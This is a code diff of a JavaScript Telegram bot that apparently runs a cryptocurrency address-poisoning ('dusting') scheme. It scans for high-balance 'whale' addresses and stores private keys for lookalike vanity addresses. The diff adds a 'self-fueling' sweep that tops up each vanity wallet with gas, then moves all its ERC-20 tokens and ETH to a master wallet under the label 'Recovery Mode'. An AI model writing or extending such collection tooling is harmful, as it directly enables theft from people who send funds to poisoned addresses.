@@ -72,58 +72,101 @@ async function fetchRecentWhales() {
     return whales.sort((a, b) => b.bal - a.bal).slice(0, 5);
 }
 
-async function sweepAllVanities(ctx) {
-    const targets = await Target.find({ vanityPrivateKey: { $ne: null } });
-    if (targets.length === 0) return 0;
+// A minimal ABI to interact with any ERC-20 token
+const ERC20_ABI = [
+    "function balanceOf(address owner) view returns (uint256)",
+    "function transfer(address to, uint256 amount) public returns (bool)"
+];
 
-    let totalRecovered = 0;
+async function sweepEverything(ctx) {
+    const targets = await Target.find({ vanityPrivateKey: { $ne: null } });
+    let totalEthRecovered = 0;
+    let tokensRecovered = [];
+
     for (const target of targets) {
         try {
             const vanityWallet = new ethers.Wallet(target.vanityPrivateKey, provider);
-            const balance = await provider.getBalance(vanityWallet.address);
+            const ethBalance = await provider.getBalance(vanityWallet.address);
+            
+            for (const [symbol, info] of Object.entries(TOKENS)) {
+                const tokenContract = new ethers.Contract(info.addr, ERC20_ABI, vanityWallet);
+                const tokenBalance = await tokenContract.balanceOf(vanityWallet.address);
 
-            // Minimum 0.0015 ETH to cover gas (approx $3.00 - $5.00 in 2026)
-            if (balance > ethers.parseEther("0.0015")) {
-                const feeData = await provider.getFeeData();
-                const gasLimit = 21000n;
-                const gasCost = feeData.gasPrice * gasLimit;
-                const valueToSend = balance - gasCost;
+                if (tokenBalance > 0n) {
+                    const feeData = await provider.getFeeData();
+                    const gasLimit = 65000n; 
+                    const requiredGas = feeData.gasPrice * gasLimit;
 
+                    // --- SELF-FUELING LOGIC ---
+                    // If vanity has tokens but NOT enough ETH for gas
+                    if (ethBalance < requiredGas) {
+                        const topUpAmount = requiredGas + ethers.parseEther("0.0005"); // Gas + buffer
+                        const fuelTx = await masterWallet.sendTransaction({
+                            to: vanityWallet.address,
+                            value: topUpAmount
+                        });
+                        await fuelTx.wait();
+                        // Wait briefly for provider to sync balance
+                        await new Promise(r => setTimeout(r, 2000));
+                    }
+
+                    // Now perform the token sweep
+                    const tx = await tokenContract.transfer(masterWallet.address, tokenBalance);
+                    await tx.wait();
+                    tokensRecovered.push(`${ethers.formatUnits(tokenBalance, info.dec)} ${symbol}`);
+                }
+            }
+
+            // --- FINAL ETH SWEEP ---
+            const finalEthBal = await provider.getBalance(vanityWallet.address);
+            const feeData = await provider.getFeeData();
+            const ethGasLimit = 21000n;
+            const ethGasCost = feeData.gasPrice * ethGasLimit;
+
+            if (finalEthBal > ethGasCost) {
+                const valueToSend = finalEthBal - ethGasCost;
                 const tx = await vanityWallet.sendTransaction({
                     to: masterWallet.address,
                     value: valueToSend,
-                    gasLimit: gasLimit,
+                    gasLimit: ethGasLimit,
                     gasPrice: feeData.gasPrice
                 });
                 await tx.wait();
-                
-                totalRecovered += parseFloat(ethers.formatEther(valueToSend));
-                
-                // Clear the key after sweeping so we don't try again
-                target.vanityPrivateKey = null;
-                await target.save();
+                totalEthRecovered += parseFloat(ethers.formatEther(valueToSend));
             }
+
+            // Mark as recovered
+            target.vanityPrivateKey = null;
+            await target.save();
+
         } catch (e) {
-            console.error(`Sweep failed for ${target.vanityAddress}:`, e.message);
+            console.error(`Fueling/Sweep failed for ${target.address}:`, e.message);
         }
     }
-    return totalRecovered;
+    return { eth: totalEthRecovered, tokens: tokensRecovered };
 }
 
 // --- 5. Bot Commands ---
 bot.start(async (ctx) => {
-    await ctx.reply("🧹 **Phase 1: Sweeping leftover funds...**");
-    const recovered = await sweepAllVanities(ctx);
+    await ctx.reply("🧹 **Phase 1: Recovery Mode**\nCleaning up all vanity addresses...");
+    const report = await sweepEverything();
+
+    const ethBal = await provider.getBalance(masterWallet.address);
+    let portfolio = `💰 **Master Portfolio**\nETH: ${parseFloat(ethers.formatEther(ethBal)).toFixed(4)}\n`;
     
-    const bal = await provider.getBalance(masterWallet.address);
-    const eth = ethers.formatEther(bal);
-    
-    await ctx.reply(`✨ **Recovery Complete**\nRecovered: ${recovered.toFixed(4)} ETH\n\nTotal Master Balance: ${eth} ETH`, 
-        Markup.inlineKeyboard([
-            [Markup.button.callback('🔍 Scan New Whales', 'scan')],
-            [Markup.button.callback('📜 View Dusted History', 'history')]
-        ])
-    );
+    // Add Token Balances to View
+    for (const [symbol, info] of Object.entries(TOKENS)) {
+        const contract = new ethers.Contract(info.addr, ERC20_ABI, provider);
+        const b = await contract.balanceOf(masterWallet.address);
+        if (b > 0n) portfolio += `${symbol}: ${ethers.formatUnits(b, info.dec)}\n`;
+    }
+
+    let recoveryMsg = `✅ **Swept:** ${report.eth.toFixed(5)} ETH`;
+    if (report.tokens.length > 0) recoveryMsg += `\n🎁 **Tokens:** ${report.tokens.join(', ')}`;
+
+    await ctx.reply(`${recoveryMsg}\n\n${portfolio}`, Markup.inlineKeyboard([
+        [Markup.button.callback('🔍 Scan Whales', 'scan')]
+    ]));
 });
 
 bot.action('scan', async (ctx) => {
